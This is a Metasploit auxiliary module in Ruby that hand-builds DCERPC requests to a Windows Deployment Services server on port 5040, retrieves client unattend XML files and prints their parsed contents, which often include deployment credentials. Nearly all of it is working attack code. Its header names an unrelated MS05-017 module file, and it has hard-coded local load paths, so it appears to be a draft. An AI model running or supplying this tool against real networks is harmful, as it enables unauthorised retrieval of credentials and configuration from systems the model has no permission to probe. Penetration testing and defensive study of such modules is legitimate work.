##
# $Id: ms05_017_msmq.rb 14976 2012-03-18 05:08:13Z rapid7 $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'rex/proto/dcerpc'
require 'rex/parser/unattend'

load '/opt/metasploit/msf3/lib/rex/parser/unattend.rb'
load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/client.rb'
load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/packet.rb'
load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/handle.rb'

class Metasploit3 < Msf::Auxiliary

    include Msf::Exploit::Remote::DCERPC

    DCERPCPacket   = Rex::Proto::DCERPC::Packet
    DCERPCClient   = Rex::Proto::DCERPC::Client
    DCERPCResponse = Rex::Proto::DCERPC::Response
    DCERPCUUID     = Rex::Proto::DCERPC::UUID

	
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Windows Deployment Services Unattend Retrieval',
			'Description'    => %q{
						This module retrieves the client unattend file from Windows
						Deployment Services RPC service.
			},
			'Author'         => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '',
			'References'     =>
				[
					[ 'MSDN', 'http://msdn.microsoft.com/en-us/library/dd891255(prot.20).aspx'],
				],
			'DisclosureDate' => 'N/A',
			))

		register_options(
			[
				Opt::RPORT(5040),
			], self.class)
	end
	
	def run 
	
		# Create a handler with our UUID and Transfer Syntax
		self.handle = Rex::Proto::DCERPC::Handle.new(	['1a927394-352e-4553-ae3f-7cf4aafca620', '1.0','71710533-beba-4937-8319-b5dbef9ccc36', 1],
														'ncacn_ip_tcp', rhost, [datastore['RPORT']])
		
		print_status("Binding to #{handle} ...")
		self.dcerpc = Rex::Proto::DCERPC::Client.new(self.handle, self.sock)
		print_status("Bound to #{handle} ...")
		
		
		archs = [9,0,6,5]
	
		archs.each do |raw|
			arch  = [raw].pack('C')
			result = request_client_unattend(arch)
			
			unless result.nil?
				parse_client_unattend(result)
			end
		end
	end
	
	def request_client_unattend(arch)	
		# Construct WDS Control Protocol Message:
		header = "\x38\x02\x00\x00\x00\x00\x00\x00\x38\x02\x00\x00\x00\x00\x00\x00"

		endpoint_header = "\x28\x00\x00\x01\x10\x02\x00\x00\x5a\xeb\xde\xd8\xfd\xef\xb2\x43\x99\xfc\x1a\x8a\x59\x21\xc2\x27\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		operation_header = "\x10\x02\x00\x00\x00\x01\x01\x73\x05\x00\x00\x00\x04\x00\x00\x00"
		
		architecture_variable_header = "\x41\x00\x52\x00\x43\x00\x48\x00\x49\x00\x54\x00\x45\x00\x43\x00\x54\x00\x55\x00\x52\x00\x45\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00"
		architecture_value = "#{arch}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		architecture_variable = architecture_variable_header + architecture_value
		
		client_guid_variable = "\x43\x00\x4c\x00\x49\x00\x45\x00\x4e\x00\x54\x00\x5f\x00\x47\x00\x55\x00\x49\x00\x44\x00\x00\x00\x49\x00\x44\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x42\x00\x00\x00\x00\x00\x00\x00\x35\x00\x36\x00\x34\x00\x44\x00\x41\x00\x36\x00\x31\x00\x44\x00\x32\x00\x41\x00\x45\x00\x31\x00\x41\x00\x41\x00\x42\x00\x32\x00\x38\x00\x36\x00\x34\x00\x46\x00\x34\x00\x34\x00\x46\x00\x32\x00\x38\x00\x32\x00\x46\x00\x30\x00\x34\x00\x33\x00\x34\x00\x30\x00\x00\x00\x61\x00\x38\x00\x39\x00\x00\x00\x6d\x69\x6e\x69\x6e\x74"

		client_mac_variable_header = "\x43\x00\x4c\x00\x49\x00\x45\x00\x4e\x00\x54\x00\x5f\x00\x4d\x00\x41\x00\x43\x00\x00\x00\x36\x6f\x31\x33\x37\x3c\x08\x4d\x53\x46\x54\x20\x35\x2e\x30\x37\x0c\x01\x0f\x03\x06\x2c\x2e\x2f\x1f\x21\x79\xf9\x2b\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x42\x00\x00\x00\x00\x00\x00\x00"

		# TODO Does this need to match our current MAC? Doesn't appear to care.
		client_mac_value = "\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x35\x00\x30\x00\x35\x00\x36\x00\x33\x00\x35\x00\x31\x00\x41\x00\x37\x00\x35\x00\x00\x00\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

		version_variable = "\x56\x00\x45\x00\x52\x00\x53\x00\x49\x00\x4f\x00\x4e\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		
		stub_data = header + endpoint_header + operation_header + architecture_variable + client_guid_variable + client_mac_variable_header + client_mac_value + version_variable
		
		print_status('Sending Client Unattend request ...')
		response = dcerpc.call(0, stub_data)

		if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			print_status('Received response ...')
			data = dcerpc.last_response.stub_data
			
			# Check WDSC_Operation_Header OpCode-ErrorCode is success 0x000000)
			op_error_code = data.unpack('i*')[18]
			if op_error_code == 0
				return dcerpc.last_response.stub_data
			else
				print_error("Error code received: #{op_error_code}")
				return nil
			end
		end
	end
	
	def extract_unattend(data)
		start = data.index('<?xml')
		finish = data.index('</unattend>')+10
		return data[start..finish]
	end
	
	def parse_client_unattend(data)
		begin
			xml = REXML::Document.new(extract_unattend(data))
			rescue REXML::ParseException => e
					print_error("Invalid XML format")
					vprint_line(e.message)
			end
	
		tables = Rex::Parser::Unattend.parse(xml).flatten
		
		tables.each do |out|
			print_line(out.to_s)
		end
	end
end
